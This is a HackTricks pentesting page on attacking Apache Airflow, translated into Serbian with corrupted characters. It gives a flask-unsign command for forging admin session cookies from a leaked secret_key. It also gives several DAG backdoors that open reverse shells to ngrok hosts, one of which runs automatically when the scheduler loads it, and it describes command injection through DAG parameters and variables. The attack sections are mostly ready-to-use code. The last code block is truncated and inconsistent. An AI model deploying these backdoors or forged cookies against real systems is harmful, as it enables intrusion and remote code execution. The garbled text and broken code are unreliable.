# Apache Airflow Security

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org) slu쬴 kao platforma za **orchestraciju i zakazivanje podataka ili radnih tokova**. Termin "orchestracija" u kontekstu podataka ozna캜ava proces organizovanja, koordinacije i upravljanja slo쬰nim radnim tokovima podataka koji poti캜u iz razli캜itih izvora. Primarna svrha ovih orkestriranih radnih tokova podataka je da obezbede obra캠ene i upotrebljive skupove podataka. Ovi skupovi podataka se 코iroko koriste u mnogim aplikacijama, uklju캜uju캖i, ali ne ograni캜avaju캖i se na alate za poslovnu inteligenciju, modele podataka i ma코inskog u캜enja, koji su svi osnovni za funkcionisanje aplikacija velikih podataka.

U su코tini, Apache Airflow 캖e vam omogu캖iti da **zakazujete izvr코enje koda kada se ne코to** (doga캠aj, cron) **dogodi**.

### Local Lab

#### Docker-Compose

Mo쬰te koristiti **docker-compose konfiguracioni fajl sa** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) da pokrenete kompletno apache airflow docker okru쬰nje. (Ako ste na MacOS-u, obavezno dodelite najmanje 6GB RAM-a docker VM-u).

#### Minikube

Jedan jednostavan na캜in da **pokrenete apache airflow** je da ga pokrenete **sa minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Airflow Konfiguracija

Airflow mo쬰 캜uvati **osetljive informacije** u svojoj konfiguraciji ili mo쬰te prona캖i slabe konfiguracije:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

### Airflow RBAC

Pre nego 코to po캜nete da napadate Airflow, trebali biste razumeti **kako funkcioni코u dozvole**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

### Napadi

#### Web Konzola Enumeracija

Ako imate **pristup web konzoli**, mo쬯a 캖ete mo캖i da pristupite nekim ili svim slede캖im informacijama:

* **Varijable** (Prilago캠ene osetljive informacije mogu biti sa캜uvane ovde)
* **Konekcije** (Prilago캠ene osetljive informacije mogu biti sa캜uvane ovde)
* Pristupite im na `http://<airflow>/connection/list/`
* [**Konfiguracija**](./#airflow-configuration) (Osetljive informacije kao 코to su **`secret_key`** i lozinke mogu biti sa캜uvane ovde)
* Lista **korisnika i uloga**
* **Kod svakog DAG-a** (koji mo쬰 sadr쬬ti zanimljive informacije)

#### Preuzimanje Vrednosti Varijabli

Varijable se mogu 캜uvati u Airflow-u tako da **DAG-ovi** mogu **pristupiti** njihovim vrednostima. Sli캜no je tajnama drugih platformi. Ako imate **dovoljno dozvola**, mo쬰te im pristupiti u GUI-u na `http://<airflow>/variable/list/`.\
Airflow po defaultu prikazuje vrednost varijable u GUI-u, me캠utim, prema [**ovome**](https://marclamberti.com/blog/variables-with-apache-airflow/) mogu캖e je postaviti **listu varijabli** 캜ija 캖e **vrednost** biti prikazana kao **zvezdice** u **GUI-u**.

![](<../../.gitbook/assets/image (164).png>)

Me캠utim, ove **vrednosti** se i dalje mogu **preuzeti** putem **CLI** (morate imati pristup bazi podataka), **izvr코avanjem proizvoljnog DAG-a**, **API** pristupom ta캜ki varijabli (API mora biti aktiviran), i **캜ak i samim GUI-em!**\
Da biste pristupili tim vrednostima iz GUI-a, jednostavno **izaberite varijable** kojima 쬰lite da pristupite i **kliknite na Akcije -> Izvezi**.\
Drugi na캜in je da izvr코ite **bruteforce** na **skrivenoj vrednosti** koriste캖i **filtriranje pretrage** dok je ne dobijete:

![](<../../.gitbook/assets/image (152).png>)

#### Eskalacija Privilegija

Ako je konfiguracija **`expose_config`** postavljena na **True**, od **uloge Korisnik** i **navi코e** mogu **캜itati** **konfiguraciju na web-u**. U ovoj konfiguraciji se pojavljuje **`secret_key`**, 코to zna캜i da svaki korisnik sa ovim va쬰캖im mo쬰 **napraviti svoj potpisani kola캜i캖 da bi se pretvarao da je bilo koji drugi korisni캜ki nalog**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Backdoor (RCE u Airflow radniku)

Ako imate **pristup za pisanje** na mestu gde se **DAG-ovi 캜uvaju**, mo쬰te jednostavno **napraviti jedan** koji 캖e vam poslati **obrnuti shell.**\
Imajte na umu da 캖e ovaj obrnuti shell biti izvr코en unutar **airflow radni캜kog kontejnera:**
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Backdoor (RCE u Airflow scheduler-u)

Ako postavite ne코to da bude **izvr코eno u korenu koda**, u trenutku pisanja ovog teksta, bi캖e **izvr코eno od strane scheduler-a** nakon nekoliko sekundi nakon 코to ga stavite unutar DAG-ove fascikle.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### Kreiranje DAG-a

Ako uspete da **kompromitujete ma코inu unutar DAG klastera**, mo쬰te kreirati nove **DAG skripte** u `dags/` folderu i one 캖e biti **replicirane na ostalim ma코inama** unutar DAG klastera.

#### Injekcija koda u DAG

Kada izvr코avate DAG iz GUI-a, mo쬰te **proslediti argumente**.\
Stoga, ako DAG nije pravilno kodiran, mogao bi biti **ranjiv na Injekciju Komandi.**\
To se desilo u ovom CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Sve 코to treba da znate da **po캜nete da tra쬴te injekcije komandi u DAG-ovima** je da se **parametri** **pristupaju** sa kodom **`dag_run.conf.get("param_name")`**.

맚avi코e, ista ranjivost mo쬰 se javiti sa **varijablama** (imajte na umu da sa dovoljno privilegija mo쬰te **kontrolisati vrednost varijabli** u GUI-u). Varijable se **pristupaju sa**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Ako se koriste, na primer, unutar bash komande, mogli biste izvr코iti injekciju komande.

{% hint style="success" %}
U캜ite i ve쬭ajte AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
U캜ite i ve쬭ajte GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
